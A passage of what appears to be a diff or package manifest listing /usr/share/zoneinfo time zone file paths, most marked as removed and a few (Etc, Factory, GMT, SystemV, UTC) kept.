-./usr/share/zoneinfo/Australia/Brisbane
-./usr/share/zoneinfo/Australia/Broken_Hill
-./usr/share/zoneinfo/Australia/Canberra
-./usr/share/zoneinfo/Australia/Darwin
-./usr/share/zoneinfo/Australia/Hobart
-./usr/share/zoneinfo/Australia/LHI
-./usr/share/zoneinfo/Australia/Lindeman
-./usr/share/zoneinfo/Australia/Lord_Howe
-./usr/share/zoneinfo/Australia/Melbourne
-./usr/share/zoneinfo/Australia/NSW
-./usr/share/zoneinfo/Australia/North
-./usr/share/zoneinfo/Australia/Perth
-./usr/share/zoneinfo/Australia/Queensland
-./usr/share/zoneinfo/Australia/South
-./usr/share/zoneinfo/Australia/Sydney
-./usr/share/zoneinfo/Australia/Tasmania
-./usr/share/zoneinfo/Australia/Victoria
-./usr/share/zoneinfo/Australia/West
-./usr/share/zoneinfo/Australia/Yancowinna
-./usr/share/zoneinfo/Brazil
-./usr/share/zoneinfo/Brazil/Acre
-./usr/share/zoneinfo/Brazil/DeNoronha
-./usr/share/zoneinfo/Brazil/East
-./usr/share/zoneinfo/Brazil/West
-./usr/share/zoneinfo/CET
-./usr/share/zoneinfo/CST6CDT
-./usr/share/zoneinfo/Canada
-./usr/share/zoneinfo/Canada/Atlantic
-./usr/share/zoneinfo/Canada/Central
-./usr/share/zoneinfo/Canada/East-Saskatchewan
-./usr/share/zoneinfo/Canada/Eastern
-./usr/share/zoneinfo/Canada/Mountain
-./usr/share/zoneinfo/Canada/Newfoundland
-./usr/share/zoneinfo/Canada/Pacific
-./usr/share/zoneinfo/Canada/Saskatchewan
-./usr/share/zoneinfo/Canada/Yukon
-./usr/share/zoneinfo/Chile
-./usr/share/zoneinfo/Chile/Continental
-./usr/share/zoneinfo/Chile/EasterIsland
-./usr/share/zoneinfo/Cuba
-./usr/share/zoneinfo/EET
-./usr/share/zoneinfo/EST
-./usr/share/zoneinfo/EST5EDT
-./usr/share/zoneinfo/Egypt
-./usr/share/zoneinfo/Eire
 ./usr/share/zoneinfo/Etc
-./usr/share/zoneinfo/Etc/GMT
-./usr/share/zoneinfo/Etc/GMT+0
-./usr/share/zoneinfo/Etc/GMT+1
-./usr/share/zoneinfo/Etc/GMT+10
-./usr/share/zoneinfo/Etc/GMT+11
-./usr/share/zoneinfo/Etc/GMT+12
-./usr/share/zoneinfo/Etc/GMT+2
-./usr/share/zoneinfo/Etc/GMT+3
-./usr/share/zoneinfo/Etc/GMT+4
-./usr/share/zoneinfo/Etc/GMT+5
-./usr/share/zoneinfo/Etc/GMT+6
-./usr/share/zoneinfo/Etc/GMT+7
-./usr/share/zoneinfo/Etc/GMT+8
-./usr/share/zoneinfo/Etc/GMT+9
-./usr/share/zoneinfo/Etc/GMT-0
-./usr/share/zoneinfo/Etc/GMT-1
-./usr/share/zoneinfo/Etc/GMT-10
-./usr/share/zoneinfo/Etc/GMT-11
-./usr/share/zoneinfo/Etc/GMT-12
-./usr/share/zoneinfo/Etc/GMT-13
-./usr/share/zoneinfo/Etc/GMT-14
-./usr/share/zoneinfo/Etc/GMT-2
-./usr/share/zoneinfo/Etc/GMT-3
-./usr/share/zoneinfo/Etc/GMT-4
-./usr/share/zoneinfo/Etc/GMT-5
-./usr/share/zoneinfo/Etc/GMT-6
-./usr/share/zoneinfo/Etc/GMT-7
-./usr/share/zoneinfo/Etc/GMT-8
-./usr/share/zoneinfo/Etc/GMT-9
-./usr/share/zoneinfo/Etc/GMT0
-./usr/share/zoneinfo/Etc/Greenwich
-./usr/share/zoneinfo/Etc/UCT
-./usr/share/zoneinfo/Etc/UTC
-./usr/share/zoneinfo/Etc/Universal
-./usr/share/zoneinfo/Etc/Zulu
-./usr/share/zoneinfo/Europe
-./usr/share/zoneinfo/Europe/Amsterdam
-./usr/share/zoneinfo/Europe/Andorra
-./usr/share/zoneinfo/Europe/Athens
-./usr/share/zoneinfo/Europe/Belfast
-./usr/share/zoneinfo/Europe/Belgrade
-./usr/share/zoneinfo/Europe/Berlin
-./usr/share/zoneinfo/Europe/Bratislava
-./usr/share/zoneinfo/Europe/Brussels
-./usr/share/zoneinfo/Europe/Bucharest
-./usr/share/zoneinfo/Europe/Budapest
-./usr/share/zoneinfo/Europe/Chisinau
-./usr/share/zoneinfo/Europe/Copenhagen
-./usr/share/zoneinfo/Europe/Dublin
-./usr/share/zoneinfo/Europe/Gibraltar
-./usr/share/zoneinfo/Europe/Helsinki
-./usr/share/zoneinfo/Europe/Istanbul
-./usr/share/zoneinfo/Europe/Kaliningrad
-./usr/share/zoneinfo/Europe/Kiev
-./usr/share/zoneinfo/Europe/Lisbon
-./usr/share/zoneinfo/Europe/Ljubljana
-./usr/share/zoneinfo/Europe/London
-./usr/share/zoneinfo/Europe/Luxembourg
-./usr/share/zoneinfo/Europe/Madrid
-./usr/share/zoneinfo/Europe/Malta
-./usr/share/zoneinfo/Europe/Minsk
-./usr/share/zoneinfo/Europe/Monaco
-./usr/share/zoneinfo/Europe/Moscow
-./usr/share/zoneinfo/Europe/Nicosia
-./usr/share/zoneinfo/Europe/Oslo
-./usr/share/zoneinfo/Europe/Paris
-./usr/share/zoneinfo/Europe/Prague
-./usr/share/zoneinfo/Europe/Riga
-./usr/share/zoneinfo/Europe/Rome
-./usr/share/zoneinfo/Europe/Samara
-./usr/share/zoneinfo/Europe/San_Marino
-./usr/share/zoneinfo/Europe/Sarajevo
-./usr/share/zoneinfo/Europe/Simferopol
-./usr/share/zoneinfo/Europe/Skopje
-./usr/share/zoneinfo/Europe/Sofia
-./usr/share/zoneinfo/Europe/Stockholm
-./usr/share/zoneinfo/Europe/Tallinn
-./usr/share/zoneinfo/Europe/Tirane
-./usr/share/zoneinfo/Europe/Tiraspol
-./usr/share/zoneinfo/Europe/Uzhgorod
-./usr/share/zoneinfo/Europe/Vaduz
-./usr/share/zoneinfo/Europe/Vatican
-./usr/share/zoneinfo/Europe/Vienna
-./usr/share/zoneinfo/Europe/Vilnius
-./usr/share/zoneinfo/Europe/Warsaw
-./usr/share/zoneinfo/Europe/Zagreb
-./usr/share/zoneinfo/Europe/Zaporozhye
-./usr/share/zoneinfo/Europe/Zurich
 ./usr/share/zoneinfo/Factory
-./usr/share/zoneinfo/GB
-./usr/share/zoneinfo/GB-Eire
 ./usr/share/zoneinfo/GMT
-./usr/share/zoneinfo/GMT+0
-./usr/share/zoneinfo/GMT-0
-./usr/share/zoneinfo/GMT0
-./usr/share/zoneinfo/Greenwich
-./usr/share/zoneinfo/HST
-./usr/share/zoneinfo/Hongkong
-./usr/share/zoneinfo/Iceland
-./usr/share/zoneinfo/Indian
-./usr/share/zoneinfo/Indian/Antananarivo
-./usr/share/zoneinfo/Indian/Chagos
-./usr/share/zoneinfo/Indian/Christmas
-./usr/share/zoneinfo/Indian/Cocos
-./usr/share/zoneinfo/Indian/Comoro
-./usr/share/zoneinfo/Indian/Kerguelen
-./usr/share/zoneinfo/Indian/Mahe
-./usr/share/zoneinfo/Indian/Maldives
-./usr/share/zoneinfo/Indian/Mauritius
-./usr/share/zoneinfo/Indian/Mayotte
-./usr/share/zoneinfo/Indian/Reunion
-./usr/share/zoneinfo/Iran
-./usr/share/zoneinfo/Israel
-./usr/share/zoneinfo/Jamaica
-./usr/share/zoneinfo/Japan
-./usr/share/zoneinfo/Kwajalein
-./usr/share/zoneinfo/Libya
-./usr/share/zoneinfo/MET
-./usr/share/zoneinfo/MST
-./usr/share/zoneinfo/MST7MDT
-./usr/share/zoneinfo/Mexico
-./usr/share/zoneinfo/Mexico/BajaNorte
-./usr/share/zoneinfo/Mexico/BajaSur
-./usr/share/zoneinfo/Mexico/General
-./usr/share/zoneinfo/Mideast
-./usr/share/zoneinfo/Mideast/Riyadh87
-./usr/share/zoneinfo/Mideast/Riyadh88
-./usr/share/zoneinfo/Mideast/Riyadh89
-./usr/share/zoneinfo/NZ
-./usr/share/zoneinfo/NZ-CHAT
-./usr/share/zoneinfo/Navajo
-./usr/share/zoneinfo/PRC
-./usr/share/zoneinfo/PST8PDT
-./usr/share/zoneinfo/Pacific
-./usr/share/zoneinfo/Pacific/Apia
-./usr/share/zoneinfo/Pacific/Auckland
-./usr/share/zoneinfo/Pacific/Chatham
-./usr/share/zoneinfo/Pacific/Easter
-./usr/share/zoneinfo/Pacific/Efate
-./usr/share/zoneinfo/Pacific/Enderbury
-./usr/share/zoneinfo/Pacific/Fakaofo
-./usr/share/zoneinfo/Pacific/Fiji
-./usr/share/zoneinfo/Pacific/Funafuti
-./usr/share/zoneinfo/Pacific/Galapagos
-./usr/share/zoneinfo/Pacific/Gambier
-./usr/share/zoneinfo/Pacific/Guadalcanal
-./usr/share/zoneinfo/Pacific/Guam
-./usr/share/zoneinfo/Pacific/Honolulu
-./usr/share/zoneinfo/Pacific/Johnston
-./usr/share/zoneinfo/Pacific/Kiritimati
-./usr/share/zoneinfo/Pacific/Kosrae
-./usr/share/zoneinfo/Pacific/Kwajalein
-./usr/share/zoneinfo/Pacific/Majuro
-./usr/share/zoneinfo/Pacific/Marquesas
-./usr/share/zoneinfo/Pacific/Midway
-./usr/share/zoneinfo/Pacific/Nauru
-./usr/share/zoneinfo/Pacific/Niue
-./usr/share/zoneinfo/Pacific/Norfolk
-./usr/share/zoneinfo/Pacific/Noumea
-./usr/share/zoneinfo/Pacific/Pago_Pago
-./usr/share/zoneinfo/Pacific/Palau
-./usr/share/zoneinfo/Pacific/Pitcairn
-./usr/share/zoneinfo/Pacific/Ponape
-./usr/share/zoneinfo/Pacific/Port_Moresby
-./usr/share/zoneinfo/Pacific/Rarotonga
-./usr/share/zoneinfo/Pacific/Saipan
-./usr/share/zoneinfo/Pacific/Samoa
-./usr/share/zoneinfo/Pacific/Tahiti
-./usr/share/zoneinfo/Pacific/Tarawa
-./usr/share/zoneinfo/Pacific/Tongatapu
-./usr/share/zoneinfo/Pacific/Truk
-./usr/share/zoneinfo/Pacific/Wake
-./usr/share/zoneinfo/Pacific/Wallis
-./usr/share/zoneinfo/Pacific/Yap
-./usr/share/zoneinfo/Poland
-./usr/share/zoneinfo/Portugal
-./usr/share/zoneinfo/ROC
-./usr/share/zoneinfo/ROK
-./usr/share/zoneinfo/Singapore
 ./usr/share/zoneinfo/SystemV
-./usr/share/zoneinfo/SystemV/AST4
-./usr/share/zoneinfo/SystemV/AST4ADT
-./usr/share/zoneinfo/SystemV/CST6
-./usr/share/zoneinfo/SystemV/CST6CDT
-./usr/share/zoneinfo/SystemV/EST5
-./usr/share/zoneinfo/SystemV/EST5EDT
-./usr/share/zoneinfo/SystemV/HST10
-./usr/share/zoneinfo/SystemV/MST7
-./usr/share/zoneinfo/SystemV/MST7MDT
-./usr/share/zoneinfo/SystemV/PST8
-./usr/share/zoneinfo/SystemV/PST8PDT
-./usr/share/zoneinfo/SystemV/YST9
-./usr/share/zoneinfo/SystemV/YST9YDT
-./usr/share/zoneinfo/Turkey
-./usr/share/zoneinfo/UCT
-./usr/share/zoneinfo/US
-./usr/share/zoneinfo/US/Alaska
-./usr/share/zoneinfo/US/Aleutian
-./usr/share/zoneinfo/US/Arizona
-./usr/share/zoneinfo/US/Central
-./usr/share/zoneinfo/US/East-Indiana
-./usr/share/zoneinfo/US/Eastern
-./usr/share/zoneinfo/US/Hawaii
-./usr/share/zoneinfo/US/Indiana-Starke
-./usr/share/zoneinfo/US/Michigan
-./usr/share/zoneinfo/US/Mountain
-./usr/share/zoneinfo/US/Pacific
-./usr/share/zoneinfo/US/Pacific-New
-./usr/share/zoneinfo/US/Samoa
 ./usr/share/zoneinfo/UTC
-./usr/share/zoneinfo/Universal
-./usr/share/zoneinfo/W-SU
-./usr/share/zoneinfo/WET
-./usr/share/zoneinfo/Zulu
-./usr/share/zoneinfo/posix
-./usr/share/zoneinfo/posix/Africa
-./usr/share/zoneinfo/posix/Africa/Abidjan
-./usr/share/zoneinfo/posix/Africa/Accra
-./usr/share/zoneinfo/posix/Africa/Addis_Ababa
-./usr/share/zoneinfo/posix/Africa/Algiers
-./usr/share/zoneinfo/posix/Africa/Asmera
-./usr/share/zoneinfo/posix/Africa/Bamako
-./usr/share/zoneinfo/posix/Africa/Bangui
-./usr/share/zoneinfo/posix/Africa/Banjul
-./usr/share/zoneinfo/posix/Africa/Bissau
-./usr/share/zoneinfo/posix/Africa/Blantyre
-./usr/share/zoneinfo/posix/Africa/Brazzaville
-./usr/share/zoneinfo/posix/Africa/Bujumbura
-./usr/share/zoneinfo/posix/Africa/Cairo
-./usr/share/zoneinfo/posix/Africa/Casablanca
-./usr/share/zoneinfo/posix/Africa/Ceuta
-./usr/share/zoneinfo/posix/Africa/Conakry
-./usr/share/zoneinfo/posix/Africa/Dakar
-./usr/share/zoneinfo/posix/Africa/Dar_es_Salaam
-./usr/share/zoneinfo/posix/Africa/Djibouti
-./usr/share/zoneinfo/posix/Africa/Douala
-./usr/share/zoneinfo/posix/Africa/El_Aaiun
-./usr/share/zoneinfo/posix/Africa/Freetown
-./usr/share/zoneinfo/posix/Africa/Gaborone
-./usr/share/zoneinfo/posix/Africa/Harare
-./usr/share/zoneinfo/posix/Africa/Johannesburg
-./usr/share/zoneinfo/posix/Africa/Kampala
-./usr/share/zoneinfo/posix/Africa/Khartoum
-./usr/share/zoneinfo/posix/Africa/Kigali
-./usr/share/zoneinfo/posix/Africa/Kinshasa
-./usr/share/zoneinfo/posix/Africa/Lagos
-./usr/share/zoneinfo/posix/Africa/Libreville
-./usr/share/zoneinfo/posix/Africa/Lome
-./usr/share/zoneinfo/posix/Africa/Luanda
-./usr/share/zoneinfo/posix/Africa/Lubumbashi
-./usr/share/zoneinfo/posix/Africa/Lusaka
-./usr/share/zoneinfo/posix/Africa/Malabo
-./usr/share/zoneinfo/posix/Africa/Maputo
-./usr/share/zoneinfo/posix/Africa/Maseru
-./usr/share/zoneinfo/posix/Africa/Mbabane
-./usr/share/zoneinfo/posix/Africa/Mogadishu
-./usr/share/zoneinfo/posix/Africa/Monrovia
-./usr/share/zoneinfo/posix/Africa/Nairobi
-./usr/share/zoneinfo/posix/Africa/Ndjamena
-./usr/share/zoneinfo/posix/Africa/Niamey
-./usr/share/zoneinfo/posix/Africa/Nouakchott
-./usr/share/zoneinfo/posix/Africa/Ouagadougou
-./usr/share/zoneinfo/posix/Africa/Porto-Novo
-./usr/share/zoneinfo/posix/Africa/Sao_Tome
-./usr/share/zoneinfo/posix/Africa/Timbuktu
-./usr/share/zoneinfo/posix/Africa/Tripoli
-./usr/share/zoneinfo/posix/Africa/Tunis
-./usr/share/zoneinfo/posix/Africa/Windhoek
-./usr/share/zoneinfo/posix/America
-./usr/share/zoneinfo/posix/America/Adak
-./usr/share/zoneinfo/posix/America/Anchorage
-./usr/share/zoneinfo/posix/America/Anguilla
-./usr/share/zoneinfo/posix/America/Antigua
-./usr/share/zoneinfo/posix/America/Araguaina
-./usr/share/zoneinfo/posix/America/Aruba
-./usr/share/zoneinfo/posix/America/Asuncion
-./usr/share/zoneinfo/posix/America/Atka
-./usr/share/zoneinfo/posix/America/Barbados
-./usr/share/zoneinfo/posix/America/Belem
-./usr/share/zoneinfo/posix/America/Belize
-./usr/share/zoneinfo/posix/America/Boa_Vista
-./usr/share/zoneinfo/posix/America/Bogota
-./usr/share/zoneinfo/posix/America/Boise
-./usr/share/zoneinfo/posix/America/Buenos_Aires
-./usr/share/zoneinfo/posix/America/Cambridge_Bay
-./usr/share/zoneinfo/posix/America/Cancun
-./usr/share/zoneinfo/posix/America/Caracas
-./usr/share/zoneinfo/posix/America/Catamarca
-./usr/share/zoneinfo/posix/America/Cayenne
-./usr/share/zoneinfo/posix/America/Cayman
-./usr/share/zoneinfo/posix/America/Chicago
-./usr/share/zoneinfo/posix/America/Chihuahua
-./usr/share/zoneinfo/posix/America/Cordoba
-./usr/share/zoneinfo/posix/America/Costa_Rica
-./usr/share/zoneinfo/posix/America/Cuiaba
-./usr/share/zoneinfo/posix/America/Curacao
-./usr/share/zoneinfo/posix/America/Danmarkshavn
-./usr/share/zoneinfo/posix/America/Dawson
-./usr/share/zoneinfo/posix/America/Dawson_Creek
-./usr/share/zoneinfo/posix/America/Denver
-./usr/share/zoneinfo/posix/America/Detroit
-./usr/share/zoneinfo/posix/America/Dominica
-./usr/share/zoneinfo/posix/America/Edmonton
-./usr/share/zoneinfo/posix/America/Eirunepe
-./usr/share/zoneinfo/posix/America/El_Salvador
-./usr/share/zoneinfo/posix/America/Ensenada
-./usr/share/zoneinfo/posix/America/Fort_Wayne
-./usr/share/zoneinfo/posix/America/Fortaleza
-./usr/share/zoneinfo/posix/America/Glace_Bay
-./usr/share/zoneinfo/posix/America/Godthab
-./usr/share/zoneinfo/posix/America/Goose_Bay
-./usr/share/zoneinfo/posix/America/Grand_Turk
-./usr/share/zoneinfo/posix/America/Grenada
-./usr/share/zoneinfo/posix/America/Guadeloupe
-./usr/share/zoneinfo/posix/America/Guatemala
-./usr/share/zoneinfo/posix/America/Guayaquil
-./usr/share/zoneinfo/posix/America/Guyana
-./usr/share/zoneinfo/posix/America/Halifax
-./usr/share/zoneinfo/posix/America/Havana
-./usr/share/zoneinfo/posix/America/Hermosillo
-./usr/share/zoneinfo/posix/America/Indiana
-./usr/share/zoneinfo/posix/America/Indiana/Indianapolis
-./usr/share/zoneinfo/posix/America/Indiana/Knox
-./usr/share/zoneinfo/posix/America/Indiana/Marengo
-./usr/share/zoneinfo/posix/America/Indiana/Vevay
-./usr/share/zoneinfo/posix/America/Indianapolis
-./usr/share/zoneinfo/posix/America/Inuvik
-./usr/share/zoneinfo/posix/America/Iqaluit
-./usr/share/zoneinfo/posix/America/Jamaica
-./usr/share/zoneinfo/posix/America/Jujuy
-./usr/share/zoneinfo/posix/America/Juneau
-./usr/share/zoneinfo/posix/America/Kentucky
-./usr/share/zoneinfo/posix/America/Kentucky/Louisville
-./usr/share/zoneinfo/posix/America/Kentucky/Monticello
-./usr/share/zoneinfo/posix/America/Knox_IN
-./usr/share/zoneinfo/posix/America/La_Paz
-./usr/share/zoneinfo/posix/America/Lima
-./usr/share/zoneinfo/posix/America/Los_Angeles
-./usr/share/zoneinfo/posix/America/Louisville
-./usr/share/zoneinfo/posix/America/Maceio
-./usr/share/zoneinfo/posix/America/Managua
-./usr/share/zoneinfo/posix/America/Manaus
-./usr/share/zoneinfo/posix/America/Martinique
-./usr/share/zoneinfo/posix/America/Mazatlan
-./usr/share/zoneinfo/posix/America/Mendoza
-./usr/share/zoneinfo/posix/America/Menominee
-./usr/share/zoneinfo/posix/America/Merida
-./usr/share/zoneinfo/posix/America/Mexico_City
-./usr/share/zoneinfo/posix/America/Miquelon
-./usr/share/zoneinfo/posix/America/Monterrey
-./usr/share/zoneinfo/posix/America/Montevideo
-./usr/share/zoneinfo/posix/America/Montreal
-./usr/share/zoneinfo/posix/America/Montserrat
-./usr/share/zoneinfo/posix/America/Nassau
-./usr/share/zoneinfo/posix/America/New_York
-./usr/share/zoneinfo/posix/America/Nipigon
-./usr/share/zoneinfo/posix/America/Nome
-./usr/share/zoneinfo/posix/America/Noronha
-./usr/share/zoneinfo/posix/America/North_Dakota
-./usr/share/zoneinfo/posix/America/North_Dakota/Center
-./usr/share/zoneinfo/posix/America/Panama
-./usr/share/zoneinfo/posix/America/Pangnirtung
-./usr/share/zoneinfo/posix/America/Paramaribo
-./usr/share/zoneinfo/posix/America/Phoenix
-./usr/share/zoneinfo/posix/America/Port-au-Prince
-./usr/share/zoneinfo/posix/America/Port_of_Spain
-./usr/share/zoneinfo/posix/America/Porto_Acre
-./usr/share/zoneinfo/posix/America/Porto_Velho
-./usr/share/zoneinfo/posix/America/Puerto_Rico
-./usr/share/zoneinfo/posix/America/Rainy_River
-./usr/share/zoneinfo/posix/America/Rankin_Inlet
-./usr/share/zoneinfo/posix/America/Recife
-./usr/share/zoneinfo/posix/America/Regina
-./usr/share/zoneinfo/posix/America/Rio_Branco
-./usr/share/zoneinfo/posix/America/Rosario
-./usr/share/zoneinfo/posix/America/Santiago
-./usr/share/zoneinfo/posix/America/Santo_Domingo
-./usr/share/zoneinfo/posix/America/Sao_Paulo
-./usr/share/zoneinfo/posix/America/Scoresbysund
-./usr/share/zoneinfo/posix/America/Shiprock
-./usr/share/zoneinfo/posix/America/St_Johns
-./usr/share/zoneinfo/posix/America/St_Kitts
-./usr/share/zoneinfo/posix/America/St_Lucia
-./usr/share/zoneinfo/posix/America/St_Thomas
-./usr/share/zoneinfo/posix/America/St_Vincent
-./usr/share/zoneinfo/posix/America/Swift_Current
-./usr/share/zoneinfo/posix/America/Tegucigalpa
-./usr/share/zoneinfo/posix/America/Thule
-./usr/share/zoneinfo/posix/America/Thunder_Bay
-./usr/share/zoneinfo/posix/America/Tijuana
-./usr/share/zoneinfo/posix/America/Tortola
-./usr/share/zoneinfo/posix/America/Vancouver
-./usr/share/zoneinfo/posix/America/Virgin
-./usr/share/zoneinfo/posix/America/Whitehorse
-./usr/share/zoneinfo/posix/America/Winnipeg
-./usr/share/zoneinfo/posix/America/Yakutat
-./usr/share/zoneinfo/posix/America/Yellowknife
-./usr/share/zoneinfo/posix/Antarctica
-./usr/share/zoneinfo/posix/Antarctica/Casey
-./usr/share/zoneinfo/posix/Antarctica/Davis
-./usr/share/zoneinfo/posix/Antarctica/DumontDUrville
-./usr/share/zoneinfo/posix/Antarctica/Mawson
-./usr/share/zoneinfo/posix/Antarctica/McMurdo
-./usr/share/zoneinfo/posix/Antarctica/Palmer
-./usr/share/zoneinfo/posix/Antarctica/South_Pole
-./usr/share/zoneinfo/posix/Antarctica/Syowa
-./usr/share/zoneinfo/posix/Antarctica/Vostok
-./usr/share/zoneinfo/posix/Arctic
-./usr/share/zoneinfo/posix/Arctic/Longyearbyen
-./usr/share/zoneinfo/posix/Asia
-./usr/share/zoneinfo/posix/Asia/Aden
-./usr/share/zoneinfo/posix/Asia/Almaty
-./usr/share/zoneinfo/posix/Asia/Amman
-./usr/share/zoneinfo/posix/Asia/Anadyr
-./usr/share/zoneinfo/posix/Asia/Aqtau
-./usr/share/zoneinfo/posix/Asia/Aqtobe
-./usr/share/zoneinfo/posix/Asia/Ashgabat
-./usr/share/zoneinfo/posix/Asia/Ashkhabad
-./usr/share/zoneinfo/posix/Asia/Baghdad
-./usr/share/zoneinfo/posix/Asia/Bahrain
-./usr/share/zoneinfo/posix/Asia/Baku
-./usr/share/zoneinfo/posix/Asia/Bangkok
-./usr/share/zoneinfo/posix/Asia/Beirut
-./usr/share/zoneinfo/posix/Asia/Bishkek
-./usr/share/zoneinfo/posix/Asia/Brunei
-./usr/share/zoneinfo/posix/Asia/Calcutta
-./usr/share/zoneinfo/posix/Asia/Choibalsan
-./usr/share/zoneinfo/posix/Asia/Chongqing
-./usr/share/zoneinfo/posix/Asia/Chungking
-./usr/share/zoneinfo/posix/Asia/Colombo
-./usr/share/zoneinfo/posix/Asia/Dacca
-./usr/share/zoneinfo/posix/Asia/Damascus
-./usr/share/zoneinfo/posix/Asia/Dhaka
-./usr/share/zoneinfo/posix/Asia/Dili
-./usr/share/zoneinfo/posix/Asia/Dubai
-./usr/share/zoneinfo/posix/Asia/Dushanbe
-./usr/share/zoneinfo/posix/Asia/Gaza
-./usr/share/zoneinfo/posix/Asia/Harbin
-./usr/share/zoneinfo/posix/Asia/Hong_Kong
-./usr/share/zoneinfo/posix/Asia/Hovd
-./usr/share/zoneinfo/posix/Asia/Irkutsk
-./usr/share/zoneinfo/posix/Asia/Istanbul
-./usr/share/zoneinfo/posix/Asia/Jakarta
-./usr/share/zoneinfo/posix/Asia/Jayapura
-./usr/share/zoneinfo/posix/Asia/Jerusalem
-./usr/share/zoneinfo/posix/Asia/Kabul
-./usr/share/zoneinfo/posix/Asia/Kamchatka
-./usr/share/zoneinfo/posix/Asia/Karachi
-./usr/share/zoneinfo/posix/Asia/Kashgar
-./usr/share/zoneinfo/posix/Asia/Katmandu
-./usr/share/zoneinfo/posix/Asia/Krasnoyarsk
-./usr/share/zoneinfo/posix/Asia/Kuala_Lumpur
-./usr/share/zoneinfo/posix/Asia/Kuching
-./usr/share/zoneinfo/posix/Asia/Kuwait
-./usr/share/zoneinfo/posix/Asia/Macao
-./usr/share/zoneinfo/posix/Asia/Macau
-./usr/share/zoneinfo/posix/Asia/Magadan
-./usr/share/zoneinfo/posix/Asia/Makassar
-./usr/share/zoneinfo/posix/Asia/Manila
-./usr/share/zoneinfo/posix/Asia/Muscat
-./usr/share/zoneinfo/posix/Asia/Nicosia
-./usr/share/zoneinfo/posix/Asia/Novosibirsk
-./usr/share/zoneinfo/posix/Asia/Omsk
-./usr/share/zoneinfo/posix/Asia/Oral
-./usr/share/zoneinfo/posix/Asia/Phnom_Penh
-./usr/share/zoneinfo/posix/Asia/Pontianak
-./usr/share/zoneinfo/posix/Asia/Pyongyang
-./usr/share/zoneinfo/posix/Asia/Qatar
-./usr/share/zoneinfo/posix/Asia/Qyzylorda
-./usr/share/zoneinfo/posix/Asia/Rangoon
-./usr/share/zoneinfo/posix/Asia/Riyadh
-./usr/share/zoneinfo/posix/Asia/Riyadh87
-./usr/share/zoneinfo/posix/Asia/Riyadh88
-./usr/share/zoneinfo/posix/Asia/Riyadh89
-./usr/share/zoneinfo/posix/Asia/Saigon
-./usr/share/zoneinfo/posix/Asia/Sakhalin
-./usr/share/zoneinfo/posix/Asia/Samarkand
-./usr/share/zoneinfo/posix/Asia/Seoul
-./usr/share/zoneinfo/posix/Asia/Shanghai
-./usr/share/zoneinfo/posix/Asia/Singapore
-./usr/share/zoneinfo/posix/Asia/Taipei
-./usr/share/zoneinfo/posix/Asia/Tashkent
-./usr/share/zoneinfo/posix/Asia/Tbilisi
-./usr/share/zoneinfo/posix/Asia/Tehran
-./usr/share/zoneinfo/posix/Asia/Tel_Aviv
-./usr/share/zoneinfo/posix/Asia/Thimbu
-./usr/share/zoneinfo/posix/Asia/Thimphu
-./usr/share/zoneinfo/posix/Asia/Tokyo
-./usr/share/zoneinfo/posix/Asia/Ujung_Pandang
-./usr/share/zoneinfo/posix/Asia/Ulaanbaatar
-./usr/share/zoneinfo/posix/Asia/Ulan_Bator
-./usr/share/zoneinfo/posix/Asia/Urumqi
-./usr/share/zoneinfo/posix/Asia/Vientiane
-./usr/share/zoneinfo/posix/Asia/Vladivostok
-./usr/share/zoneinfo/posix/Asia/Yakutsk
-./usr/share/zoneinfo/posix/Asia/Yekaterinburg
-./usr/share/zoneinfo/posix/Asia/Yerevan
-./usr/share/zoneinfo/posix/Atlantic
-./usr/share/zoneinfo/posix/Atlantic/Azores
-./usr/share/zoneinfo/posix/Atlantic/Bermuda
-./usr/share/zoneinfo/posix/Atlantic/Canary
-./usr/share/zoneinfo/posix/Atlantic/Cape_Verde
-./usr/share/zoneinfo/posix/Atlantic/Faeroe
-./usr/share/zoneinfo/posix/Atlantic/Jan_Mayen
-./usr/share/zoneinfo/posix/Atlantic/Madeira
-./usr/share/zoneinfo/posix/Atlantic/Reykjavik
-./usr/share/zoneinfo/posix/Atlantic/South_Georgia
-./usr/share/zoneinfo/posix/Atlantic/St_Helena
-./usr/share/zoneinfo/posix/Atlantic/Stanley
-./usr/share/zoneinfo/posix/Australia
-./usr/share/zoneinfo/posix/Australia/ACT
-./usr/share/zoneinfo/posix/Australia/Adelaide
-./usr/share/zoneinfo/posix/Australia/Brisbane
-./usr/share/zoneinfo/posix/Australia/Broken_Hill
-./usr/share/zoneinfo/posix/Australia/Canberra
-./usr/share/zoneinfo/posix/Australia/Darwin
-./usr/share/zoneinfo/posix/Australia/Hobart
-./usr/share/zoneinfo/posix/Australia/LHI
-./usr/share/zoneinfo/posix/Australia/Lindeman
-./usr/share/zoneinfo/posix/Australia/Lord_Howe
-./usr/share/zoneinfo/posix/Australia/Melbourne
-./usr/share/zoneinfo/posix/Australia/NSW
-./usr/share/zoneinfo/posix/Australia/North
-./usr/share/zoneinfo/posix/Australia/Perth
-./usr/share/zoneinfo/posix/Australia/Queensland
-./usr/share/zoneinfo/posix/Australia/South
-./usr/share/zoneinfo/posix/Australia/Sydney
-./usr/share/zoneinfo/posix/Australia/Tasmania
-./usr/share/zoneinfo/posix/Australia/Victoria
-./usr/share/zoneinfo/posix/Australia/West
-./usr/share/zoneinfo/posix/Australia/Yancowinna
-./usr/share/zoneinfo/posix/Brazil
-./usr/share/zoneinfo/posix/Brazil/Acre
-./usr/share/zoneinfo/posix/Brazil/DeNoronha
-./usr/share/zoneinfo/posix/Brazil/East
-./usr/share/zoneinfo/posix/Brazil/West
-./usr/share/zoneinfo/posix/CET
-./usr/share/zoneinfo/posix/CST6CDT
-./usr/share/zoneinfo/posix/Canada
-./usr/share/zoneinfo/posix/Canada/Atlantic
-./usr/share/zoneinfo/posix/Canada/Central
-./usr/share/zoneinfo/posix/Canada/East-Saskatchewan
-./usr/share/zoneinfo/posix/Canada/Eastern
-./usr/share/zoneinfo/posix/Canada/Mountain
-./usr/share/zoneinfo/posix/Canada/Newfoundland
-./usr/share/zoneinfo/posix/Canada/Pacific
-./usr/share/zoneinfo/posix/Canada/Saskatchewan
-./usr/share/zoneinfo/posix/Canada/Yukon
-./usr/share/zoneinfo/posix/Chile
-./usr/share/zoneinfo/posix/Chile/Continental
-./usr/share/zoneinfo/posix/Chile/EasterIsland
-./usr/share/zoneinfo/posix/Cuba
-./usr/share/zoneinfo/posix/EET
-./usr/share/zoneinfo/posix/EST
-./usr/share/zoneinfo/posix/EST5EDT
-./usr/share/zoneinfo/posix/Egypt
-./usr/share/zoneinfo/posix/Eire
-./usr/share/zoneinfo/posix/Etc
-./usr/share/zoneinfo/posix/Etc/GMT
-./usr/share/zoneinfo/posix/Etc/GMT+0
-./usr/share/zoneinfo/posix/Etc/GMT+1
-./usr/share/zoneinfo/posix/Etc/GMT+10
